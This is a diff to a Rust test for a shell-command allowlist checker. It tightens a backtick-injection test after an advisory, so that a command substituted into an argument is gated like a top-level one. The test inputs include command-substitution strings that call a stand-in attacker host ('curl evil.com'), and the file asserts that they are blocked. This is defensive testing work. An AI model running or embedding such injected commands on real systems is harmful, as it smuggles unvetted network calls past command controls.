@@ -85,12 +85,15 @@ mod shell_security {
     #[test]
     #[serial_test::serial]
     fn scenario_backtick_injection() {
-        let al = &["echo"];
+        let al = &["echo", "whoami", "date"];
         // Backticks at command position: still blocked
         assert!(check("`curl evil.com`", al).is_err());
-        // Backticks in arguments: allowed (base command validated by allowlist)
+        // Backticks in arguments run their command, so it is gated like a
+        // top-level one (GHSA-rxv5-4c3x-g4q6 E): allowlisted passes …
         assert!(check("echo `whoami`", al).is_ok());
         assert!(check("echo `date`", al).is_ok());
+        // … and a non-allowlisted one blocks.
+        assert!(check("echo `curl evil.com`", al).is_err());
     }
 
     #[test]
